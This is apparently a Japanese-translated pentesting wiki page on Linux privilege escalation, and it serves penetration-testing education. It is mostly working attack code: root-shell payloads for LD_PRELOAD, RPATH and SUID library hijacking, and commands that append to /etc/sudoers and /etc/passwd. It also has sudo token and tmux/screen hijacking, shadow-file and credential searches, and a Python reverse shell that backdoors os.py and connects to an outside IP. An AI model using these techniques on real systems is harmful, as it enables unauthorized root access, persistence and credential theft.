一部の Linux バージョンは、**UID > INT_MAX** のユーザーが権限昇格できるバグの影響を受けていました。詳細: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### グループ

あなたが root privileges を得られる可能性のある **グループのメンバー** かどうか確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### クリップボード

可能であれば、クリップボード内に興味深いものが含まれていないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境のパスワードを**1つでも知っている**場合は、そのパスワードを使って**各ユーザにログインを試みてください**。

### Su Brute

多くのノイズを出すことを気にしない場合、かつ `su` と `timeout` バイナリがコンピュータに存在する場合、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザに対してブルートフォースを試すことができます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザに対するブルートフォースも試みます。

## 書き込み可能な $PATH の悪用

### $PATH

もし **$PATH のいずれかのフォルダに書き込みできる**ことが分かったら、書き込み可能なフォルダ内に別ユーザ（理想的には root）が実行するコマンド名で**バックドアを作成**することで権限を昇格できる可能性があります。そのコマンドが $PATH 内であなたの書き込みフォルダより前にあるフォルダから**読み込まれない**ことが条件です。

### SUDO and SUID

sudo を使って実行できるコマンドがあるか、またはファイルに suid ビットが設定されている可能性があります。次のコマンドで確認してください:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
いくつかの**予期しないコマンドは、ファイルを読み取り・書き込みしたり、コマンドを実行したりすることがあります。** 例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo の設定によって、ユーザーがパスワードを知らなくても別のユーザーの権限でコマンドを実行できる場合がある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` が `root` として `vim` を実行できます。root ディレクトリに ssh key を追加するか、`sh` を呼び出すことで、簡単に shell を取得できます。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、何かを実行する際にユーザーが **set an environment variable** できるようにします:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**based on HTB machine Admirer** を基にしており、スクリプトを root として実行する際に任意の python ライブラリを読み込むための **PYTHONPATH hijacking** に **vulnerable** でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo 実行時のパス回避

**Jump** を使って他のファイルを読んだり、**symlinks** を使ったりします。例えば sudoers file では: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし **wildcard** が使われている（\*）と、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary (コマンドパスが指定されていない場合)

If the **sudo permission** is given to a single command **パスを指定せずに**: _hacker10 ALL= (root) less_、PATH変数を変更することでこれを悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この手法は**suid** バイナリ **が別のコマンドをパスを指定せずに実行する場合（常に_**strings**_で奇妙な SUID バイナリの内容を確認してください）**にも使用できます。

[Payload examples to execute.](payloads-to-execute.md)

### SUID バイナリ（コマンドのパスが指定されている場合）

もし**suid** バイナリが**コマンドのパスを指定して別のコマンドを実行する場合**、suidファイルが呼び出しているコマンド名と同じ名前の関数を**export**してみてください。

例えば、もし**suid** バイナリが _**/usr/sbin/service apache2 start**_ を呼び出しているなら、そのコマンド名と同じ名前の関数を作成して**export**してみてください:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
次のファイル名で保存: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、**compile it** を使ってコンパイルします:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行します
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 類似の privesc は、攻撃者が **LD_LIBRARY_PATH** 環境変数を制御している場合に悪用され得ます。攻撃者はライブラリが検索されるパスを制御できるためです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

通常と異なるように見える **SUID** 権限を持つバイナリに遭遇した場合、**.so** ファイルを適切に読み込んでいるかを確認することをお勧めします。これは次のコマンドを実行して確認できます:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇した場合、潜在的な悪用の可能性が示唆されます。

これを exploit するには、例えば _"/path/to/.config/libcalc.c"_ という C ファイルを作成し、以下のコードを記述します:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行されると、ファイルのパーミッションを操作し、権限昇格した shell を実行することで特権を取得することを目的としています。

上記の C ファイルを shared object (.so) ファイルにコンパイルするには:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けた SUID バイナリを実行すると exploit がトリガーされ、システムの乗っ取りにつながる可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
書き込み可能なフォルダからライブラリをロードする SUID binary を見つけたので、そのフォルダに必要な名前のライブラリを作成しましょう:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、ローカルのセキュリティ制限を回避するために攻撃者によって悪用され得る Unix バイナリを厳選したリストです。 [**GTFOArgs**](https://gtfoargs.github.io/) は同様のプロジェクトで、コマンドに **only inject arguments** できる場合を対象としています。

このプロジェクトは、restricted shells からの脱出、権限の昇格や維持（escalate or maintain elevated privileges）、ファイル転送、bind and reverse shells の生成、その他の post-exploitation タスクを容易にするために悪用可能な Unix バイナリの正規の機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使って、任意の sudo ルールを悪用する方法が見つかるかどうかをチェックできます。

### Reusing Sudo Tokens

パスワードは分からないが **sudo access** がある場合、**sudo コマンドの実行を待ち、そのセッショントークンをハイジャックする**ことで権限を昇格できます。

Requirements to escalate privileges:

- You already have a shell as user "_sampleuser_"
- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

(一時的に ptrace_scope を設定するには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を使うか、`/etc/sysctl.d/10-ptrace.conf` を永続的に変更して `kernel.yama.ptrace_scope = 0` を設定してください)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **second exploit** (`exploit_v2.sh`) は _/tmp_ に **root 所有で setuid** な sh シェルを作成します
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- この **3番目の exploit** (`exploit_v3.sh`) は **sudoers file を作成** し、**sudo tokens を永続化して全ユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダ、またはフォルダ内に作成されたファイルのいずれかに**書き込み権限**がある場合、バイナリ[**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)を使用して**ユーザーとPID用のsudoトークンを作成**できます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、かつそのユーザー（PID 1234）としてシェルを持っている場合、パスワードを知らなくても以下の操作で**obtain sudo privileges**できます:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` ファイルおよび `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使えるかとその方法を設定します。これらのファイルは **デフォルトではユーザー root およびグループ root によってのみ読み取ることができます**。\
**もし**このファイルを**読む**ことができれば、**いくつかの興味深い情報を取得できる可能性があります**。そして、もし任意のファイルに**書き込み**できるなら、**権限を昇格**させることができます。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みができるなら、この権限を悪用できます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD向けの`doas`のように、`sudo`バイナリの代替はいくつかあります。設定は`/etc/doas.conf`で確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

もし、**user usually connects to a machine and uses `sudo`** と分かっていて、そのユーザーコンテキスト内でシェルを取得している場合、root としてあなたのコードを実行し、その後ユーザーのコマンドを実行する **create a new sudo executable** を作成できます。次に、ユーザーコンテキストの **modify the $PATH**（例えば .bash_profile に新しいパスを追加するなど）を行えば、ユーザーが sudo を実行したときにあなたの sudo 実行ファイルが実行されます。

注意：ユーザーが別の shell（bash 以外）を使用している場合、新しいパスを追加するために他のファイルを変更する必要があります。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を変更します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります。

または次のようなコマンドを実行する:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は **読み込まれる設定ファイルがどこから来るか** を示します。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれることを意味します。これらの設定ファイルは **他のフォルダを指しており**、そこが **ライブラリ** を **検索** する場所になります。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**これはシステムが `/usr/local/lib` 内をライブラリの検索対象とすることを意味します**。

もし何らかの理由で **ユーザーに書き込み権限がある** 場合（`/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` に記載された設定内の任意のフォルダ）、権限昇格が可能になることがあります.\
この誤設定を悪用する方法については、以下のページを参照してください:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定されているこの場所でプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に `/var/tmp` に悪意のあるライブラリを `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` で作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## ケーパビリティ

Linux capabilities はプロセスに対して利用可能な root 権限の**サブセットを提供します**。これは実質的に root の**権限をより小さく独立した単位に分割**することを意味します。各単位は個別にプロセスに付与できるため、権限の全体量が減り、悪用のリスクが低減します。\
以下のページを読んで、**capabilities とその悪用方法**について詳しく学んでください:


{{#ref}}
linux-capabilities.md
{{#endref}}

## ディレクトリの権限

ディレクトリでは、**"execute" ビット**は対象のユーザーが "**cd**" でフォルダに入れることを示します。\
**"read"** ビットはユーザーがファイルを**一覧表示**できることを示し、**"write"** ビットはユーザーがファイルを**削除**および**新規作成**できることを示します。

## ACLs

Access Control Lists (ACLs) は、裁量的な権限の二次的なレイヤーを表し、従来の ugo/rwx 権限を**上書きすることができます**。これらの権限により、所有者やグループに属さない特定ユーザーに対してアクセスを許可または拒否でき、ファイルやディレクトリへのアクセス制御が強化されます。このような**粒度の細かさにより、より精密なアクセス管理が可能になります**。詳細は [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) を参照してください。

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**システムから特定の ACLs を持つファイルを取得する:**
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## shell sessions を開く

**古いバージョン**では、別ユーザー（**root**）の**shell**セッションを**hijack**できる場合があります。\
**最新バージョン**では、**自分のユーザー**のscreen sessions のみに**接続**できるようになっています。しかし、**セッション内の興味深い情報**が見つかることがあります。

### screen sessions hijacking

**screen sessions を一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは **古い tmux のバージョン** の問題でした。非特権ユーザーとして root によって作成された tmux (v2.1) セッションを hijack することはできませんでした。

**tmux セッションを一覧表示する**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間にDebian系システム（Ubuntu、Kubuntuなど）で生成されたすべての SSL および SSH キーはこのバグの影響を受ける可能性があります.\
このバグはそれらのOSで新しい ssh キーを作成したときに発生し、**可能なバリエーションがわずか32,768通りしかなかった**ためです。これは、すべての可能性を計算でき、**ssh 公開鍵を持っていれば対応する秘密鍵を検索できる**ことを意味します。計算済みの可能性はここで見つかります: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証が許可されているかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合、サーバーが空のパスワード文字列のアカウントでのログインを許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

root が ssh でログインできるかどうかを指定します。デフォルトは `no` です。可能な値:

- `yes`: root はパスワードおよび秘密鍵でログインできます
- `without-password` or `prohibit-password`: root は秘密鍵でのみログインできます
- `forced-commands-only`: root は秘密鍵でのみログインでき、かつコマンドのオプションが指定されている場合に限ります
- `no`: 許可しない

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。`%h` のようなトークンを含めることができ、これはホームディレクトリに置き換えられます。**絶対パスを指定することができます**（`/`で始まる）または**ユーザーのホームからの相対パス**。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー "**testusername**" の**private** keyでログインしようとした場合、sshがあなたのキーのpublic keyを`/home/testusername/.ssh/authorized_keys`および`/home/testusername/access`にあるものと照合することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding により、サーバー上に（without passphrases!）キーを置いておく代わりに**use your local SSH keys instead of leaving keys**ことができます。これにより、sshで**to a host**に**jump**し、そこからさらに別のホストに**jump to another**する際に、**initial host**にある**key**を**using**して接続できます。

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
注意: `Host` が `*` の場合、ユーザが別のマシンに移動するたびに、そのホストはキーにアクセスできるようになり（これはセキュリティ上の問題です）。

ファイル `/etc/ssh_config` はこの設定を**override**し、この構成を許可または拒否することができます。\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` により ssh-agent forwarding を**allow**または**deny**することができます（デフォルトは allow）。

環境で Forward Agent が設定されているのを見つけた場合、次のページを読んでください。**権限昇格に悪用できる可能性があります**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

ファイル `/etc/profile` と `/etc/profile.d/` 以下のファイルは、ユーザが新しいシェルを起動したときに実行される**スクリプト**です。したがって、これらのいずれかを書き換えたり変更できる場合、**権限を昇格できる**可能性があります。
```bash
ls -l /etc/profile /etc/profile.d/
```
不審なプロファイルスクリプトを見つけたら、**機密情報**が含まれていないか確認してください。

### Passwd/Shadow Files

OSによっては `/etc/passwd` と `/etc/shadow` ファイルが別名になっているか、バックアップが存在する場合があります。したがって、**すべて見つける**ことと、**読めるか確認する**ことで、**ファイル内にハッシュが含まれているか**を確認することをおすすめします:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等のファイル）内で**password hashes**を見つけることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、次のコマンドのいずれかでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
次にユーザー `hacker` を追加し、生成されたパスワードを設定してください。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドを使って `hacker:hacker` を使用できます。

あるいは、以下の行を使ってパスワードなしのダミーユーザを追加できます。\ 警告: これによりマシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSDプラットフォームでは `/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、`/etc/shadow` は `/etc/spwd.db` に名称変更されています。

いくつかの**機密ファイルに書き込めるか**確認してください。例えば、いくつかの**サービス設定ファイル**に書き込み可能ですか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが **tomcat** サーバを実行していて、**/etc/systemd/ 内の Tomcat サービス設定ファイル を変更できる** 場合、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
次に tomcat が起動したときに、あなたの backdoor は実行されます。

### フォルダを確認

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (おそらく最後のものは読めないでしょうが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned ファイル
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最後の数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでみてください。これは **パスワードを含んでいる可能性のある複数のファイル** を検索します。\
**別の興味深いツール** としては次があります: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — Windows、Linux、Mac のローカルコンピュータに保存された多数のパスワードを取得するためのオープンソースアプリケーションです。

### ログ

ログを読めるなら、そこに **興味深い／機密情報が含まれている** 可能性があります。ログが奇妙であればあるほど、（おそらく）より興味深くなります。\
また、一部の「**悪く**」設定された（バックドア化された？）**audit logs** は、監査ログ内に **パスワードを記録する** ことを可能にする場合があり、これはこの投稿で説明されています: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
ログを読むためには、[**adm**](interesting-groups-linux-pe/index.html#adm-group) グループが非常に役立ちます。

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名やファイルの**content**内に「**password**」という単語が含まれているファイルを確認し、ログ内のIPsやemails、あるいはhashesのregexpsも確認してください。\
ここですべてのやり方を列挙するつもりはありませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最後のチェックを確認してください。

## Writable files

### Python library hijacking

If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` の脆弱性により、ログファイルやその親ディレクトリに対して **書き込み権限** を持つユーザーが権限を昇格できる可能性があります。これは多くの場合 **root** で動作する `logrotate` を操作して任意のファイルを実行させられるためで、特に _**/etc/bash_completion.d/**_ のようなディレクトリが狙われます。確認すべきは _/var/log_ だけでなく、ログローテートが適用される任意のディレクトリのパーミッションです。

> [!TIP]
> この脆弱性は `logrotate` バージョン `3.18.0` 以下に影響します

脆弱性の詳細は次のページで確認できます: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

